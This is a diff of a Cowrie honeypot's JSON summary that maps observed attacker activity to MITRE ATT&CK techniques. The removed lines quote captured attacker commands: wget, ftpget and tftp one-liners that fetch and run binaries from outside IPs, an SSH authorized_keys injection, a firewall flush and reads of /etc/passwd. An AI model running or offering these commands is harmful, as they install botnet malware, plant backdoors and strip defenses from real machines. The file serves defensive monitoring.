@@ -1,314 +1,54 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-14 23:02:22",
+  "generated": "2026-08-15 00:04:36",
   "totals": {
-    "commands": 1658,
-    "login_failed": 3660,
-    "login_success": 124,
-    "sessions": 3914
+    "commands": 6,
+    "login_failed": 69,
+    "login_success": 2,
+    "sessions": 65
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 3660,
+      "count": 69,
       "examples": [
-        "dispatch-sjjr / dispatch-sjjr",
-        "root / 123321",
-        "root / 1234",
-        "elastic / elastic",
-        "root / 12345"
+        "adminuser / 123456",
+        "root / Qq123456",
+        "root / qwerty123",
+        "shell\\x00 / sh\\x00",
+        "milad / milad"
       ],
-      "first": "2026-08-14T00:01:53.440937Z",
-      "last": "2026-08-14T23:00:13.020689Z",
-      "unique_ips": 112
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 316,
-      "examples": [
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
-        ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
-        ">/var/tmp/d && chmod 777 /var/tmp/d && /var/tmp/d && cd /var/tmp/",
-        ">/var/run/d && chmod 777 /var/run/d && /var/run/d && cd /var/run/"
-      ],
-      "first": "2026-08-14T00:00:30.036482Z",
-      "last": "2026-08-14T22:48:35.414841Z",
-      "unique_ips": 32
+      "first": "2026-08-15T00:00:01.563880Z",
+      "last": "2026-08-15T00:04:34.431728Z",
+      "unique_ips": 5
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 124,
-      "examples": [
-        "ubuntu / 123456",
-        "enable\\x00 / linuxshell\\x00",
-        "ubuntu / ubuntu",
-        "daemon / daemon",
-        "root / root"
-      ],
-      "first": "2026-08-14T00:11:55.270801Z",
-      "last": "2026-08-14T22:47:55.717572Z",
-      "unique_ips": 86
-    },
-    {
-      "id": "T1105",
-      "name": "Ingress Tool Transfer",
-      "tactic": "Command and Control",
-      "count": 112,
-      "examples": [
-        "(ftpget 185.93.89.72 f ftpget || busybox ftpget 185.93.89.72 f ftpget) > f; chmod 777 f; ./f; rm -rf f",
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "http://185.93.89.72/wget",
-        "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
-        "/bin/busybox wget http://2.26.136.128/twget.sh -O- | sh;rm -rf tftp.sh;/bin/busybox tftp 2.26.136.128 -g -r tftp.sh -l t"
-      ],
-      "first": "2026-08-14T00:00:30.036482Z",
-      "last": "2026-08-14T22:48:35.414841Z",
-      "unique_ips": 28
-    },
-    {
-      "id": "T1082",
-      "name": "System Information Discovery",
-      "tactic": "Discovery",
-      "count": 25,
-      "examples": [
-        "uname -a",
-        "uname -s -v -n -r -m",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "uname -s -m"
-      ],
-      "first": "2026-08-14T00:12:07.783870Z",
-      "last": "2026-08-14T22:37:08.450573Z",
-      "unique_ips": 22
-    },
-    {
-      "id": "T1033",
-      "name": "System Owner/User Discovery",
-      "tactic": "Discovery",
-      "count": 22,
-      "examples": [
-        "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "id"
-      ],
-      "first": "2026-08-14T00:59:24.418630Z",
-      "last": "2026-08-14T22:47:59.261107Z",
-      "unique_ips": 22
-    },
-    {
-      "id": "T1059.004",
-      "name": "Command and Scripting Interpreter: Unix Shell",
-      "tactic": "Execution",
-      "count": 4,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-08-14T06:54:04.929658Z",
-      "last": "2026-08-14T20:45:39.195397Z",
-      "unique_ips": 4
-    },
-    {
-      "id": "T1070.004",
-      "name": "Indicator Removal: File Deletion",
-      "tactic": "Defense Evasion",
-      "count": 3,
-      "examples": [
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || "
-      ],
-      "first": "2026-08-14T06:54:04.929658Z",
-      "last": "2026-08-14T20:45:39.195397Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1083",
-      "name": "File and Directory Discovery",
-      "tactic": "Discovery",
-      "count": 3,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "ls /",
-        "for pid in /proc/[0-9]*; do case $(ls -l $pid/exe) in *\"(deleted)\"*|*\"/.\"*|*\"runmeplz\"*|*\"telnetdbot\"*|*\"dvrLocker\"*) ki"
-      ],
-      "first": "2026-08-14T10:25:18.113343Z",
-      "last": "2026-08-14T19:46:20.056503Z",
-      "unique_ips": 3
-    },
-    {
-      "id": "T1070.003",
-      "name": "Indicator Removal: Clear Command History",
-      "tactic": "Defense Evasion",
       "count": 2,
       "examples": [
-        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.228:6677/Exodus.sh; chmod +x Exodus.sh; ./",
-        "#!/bin/bash\ncd /tmp || cd /var/run || cd /mnt || cd /root || cd /\nwget http://176.65.139.228:6677/bins/x86; wget http://"
+        "enable / system"
       ],
-      "first": "2026-08-14T16:20:56.785958Z",
-      "last": "2026-08-14T16:20:57.585158Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1098.004",
-      "name": "Account Manipulation: SSH Authorized Keys",
-      "tactic": "Persistence",
-      "count": 2,
-      "examples": [
-        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
-        "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh; chmod +x setup.sh; sh setup.sh; rm -rf setup.sh; mkdir -p ~/.ssh; chatt"
-      ],
-      "first": "2026-08-14T10:25:14.110447Z",
-      "last": "2026-08-14T13:03:40.594547Z",
+      "first": "2026-08-15T00:02:00.287482Z",
+      "last": "2026-08-15T00:02:16.216089Z",
       "unique_ips": 2
-    },
-    {
-      "id": "T1489",
-      "name": "Service Stop",
-      "tactic": "Impact",
-      "count": 2,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "for pid in /proc/[0-9]*; do case $(ls -l $pid/exe) in *\"(deleted)\"*|*\"/.\"*|*\"runmeplz\"*|*\"telnetdbot\"*|*\"dvrLocker\"*) ki"
-      ],
-      "first": "2026-08-14T10:25:18.113343Z",
-      "last": "2026-08-14T19:46:20.056503Z",
-      "unique_ips": 2
-    },
-    {
-      "id": "T1037",
-      "name": "Boot or Logon Initialization Scripts",
-      "tactic": "Persistence",
-      "count": 1,
-      "examples": [
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# ================================="
-      ],
-      "first": "2026-08-14T10:25:18.113343Z",
-      "last": "2026-08-14T10:25:18.113343Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1057",
-      "name": "Process Discovery",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "/bin/busybox ps; /bin/busybox STC"
-      ],
-      "first": "2026-08-14T19:46:20.346466Z",
-      "last": "2026-08-14T19:46:20.346466Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1087.001",
-      "name": "Account Discovery: Local Account",
-      "tactic": "Discovery",
-      "count": 1,
-      "examples": [
-        "cat /etc/passwd"
-      ],
-      "first": "2026-08-14T21:48:39.700986Z",
-      "last": "2026-08-14T21:48:39.700986Z",
-      "unique_ips": 1
-    },
-    {
-      "id": "T1562.004",
-      "name": "Impair Defenses: Disable or Modify System Firewall",
-      "tactic": "Defense Evasion",
-      "count": 1,
-      "examples": [
-        "iptables -F"
-      ],
-      "first": "2026-08-14T14:02:06.142088Z",
-      "last": "2026-08-14T14:02:06.142088Z",
-      "unique_ips": 1
     }
   ],
   "unmapped": [
     [
-      "/bin/busybox",
-      572
+      "shel",
+      2
     ],
     [
       "sh",
-      66
-    ],
-    [
-      "system",
-      63
-    ],
-    [
-      "shell",
-      62
-    ],
-    [
-      "enable",
-      45
-    ],
-    [
-      "linuxshell",
-      38
-    ],
-    [
-      "ping ;sh",
-      22
-    ],
-    [
-      "cd /proc && cat self/cmdline",
-      21
-    ],
-    [
-      "enablelinuxshell",
-      20
+      2
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
-      20
-    ],
-    [
-      "busybox",
-      18
-    ],
-    [
-      ">/tmp/.codi && cd /tmp/",
-      16
-    ],
-    [
-      ">/var/.codi && cd /var/",
-      16
-    ],
-    [
-      ">/dev/.codi && cd /dev/",
-      16
-    ],
-    [
-      ">/mnt/.codi && cd /mnt/",
-      16
-    ],
-    [
-      ">/var/run/.codi && cd /var/run/",
-      16
-    ],
-    [
-      ">/var/tmp/.codi && cd /var/tmp/",
-      16
-    ],
-    [
-      ">/.codi && cd /",
-      16
-    ],
-    [
-      ">/dev/netslink/.codi && cd /dev/netslink/",
-      16
-    ],
-    [
-      ">/dev/shm/.codi && cd /dev/shm/",
-      16
+      2
     ]
   ]
 }
